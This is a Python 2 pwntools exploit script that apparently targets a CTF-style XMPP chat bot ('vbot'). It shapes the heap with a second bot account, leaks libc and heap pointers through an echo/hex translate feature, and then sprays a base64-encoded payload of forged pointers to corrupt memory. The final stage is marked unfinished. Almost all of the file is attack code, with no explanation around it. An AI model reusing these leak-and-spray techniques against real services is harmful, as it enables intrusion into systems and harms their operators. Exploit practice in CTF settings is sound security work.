#!/usr/bin/env python2

from pwn import *
from vbot import VBot, VBotBase

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])

    class GoodNameBot(VBotBase):
        def __init__(self, *args, **kwargs):
            VBotBase.__init__(self, *args, **kwargs)
            self.connect()
            self.process(block=False)

        def session_bind(self, e):
            log.info('bound to %s', self.boundjid.bare)
            if len(self.boundjid.bare) % 2 == 0:
                log.info('request another user')
                self.disconnect()
                self.connect()

    A = GoodNameBot()

    class MyVBot(VBot):
        def target_ready(self, e):
            VBot.target_ready(self, e)
            A.state.ensure('connected')
            bare = A.boundjid.bare
            prefix = 'O' * 0x20 + bare
            log.info('prefix = %s', prefix)
            # leak
            d = self.try_leak(0x800, prefix=prefix)
            if d[0x20:0x20 + len(bare)] != bare:
                self.check_fail('failed to shape heap')

            libc_ptr = u64(d[:8])
            heap_ptr = u64(d[0x10:0x18])
            log.info('libc ptr = %#x', libc_ptr)
            log.info('heap ptr = %#x', heap_ptr)

            spray_addr = heap_ptr + 0x30

            raw_input('attach')
            A.make_message(self.target, 'ping', mtype='chat').send()
            A.make_message(self.target, 'bye', mtype='normal').send()

            block = ''
            block += p64(spray_addr + 0x30) + p64(0)
            block += p64(spray_addr) + p64(len(bare))
            payload = block * (0x120 / len(block))
            for _ in xrange(8):
                self.translate('x', payload.encode('base64').replace('\n',
                    ''), 'b64', block=False)
            A.make_message(self.target, 'ping', mtype='chat').send()
            # TODO end?

        def try_leak(self, n, prefix=''):
            ret = self.translate('echo', prefix.ljust(n * 2, 'O'), 'hex')
            return ret

    B = MyVBot((host, port))
    B.connect()
    B.process(block=True)

    sys.exit(0)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, format='%(levelname)-8s %(message)s')
    # context.log_level = 'DEBUG'
    main()
